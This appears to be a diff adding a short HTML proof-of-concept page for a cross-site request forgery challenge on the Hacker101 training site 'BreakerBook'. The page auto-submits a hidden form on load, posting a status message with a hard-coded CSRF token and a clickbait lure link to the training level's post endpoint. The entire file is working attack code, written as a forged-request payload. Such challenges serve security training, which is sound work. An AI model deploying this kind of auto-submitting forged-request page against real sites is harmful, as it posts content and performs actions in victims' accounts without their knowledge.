@@ -1,0 +1,19 @@
+<html>
+    <header>
+        <title>
+            BreakerBook CSRF with CSRF Token PoC
+        </title>
+        <script>
+            window.onload = function() {
+                document.forms.form1.submit()
+            }
+        </script>
+    </header>
+    <body>
+        <form action="https://levels-a.hacker101.com/levels/1/post" method="POST" id="form1">
+            <!-- This is the token that was originally embeded in the site -->
+            <input name="csrf" value="275933287ba3c641ab62fcd78ada3c04" type="hidden">
+            <textarea cols="40" rows="3" name="status" style="display:none">wATCH THIS VIDEO NOW ITS SUPER COOL IM DYING http://127.0.0.1:8080</textarea>
+        </form>
+    </body>
+</html>
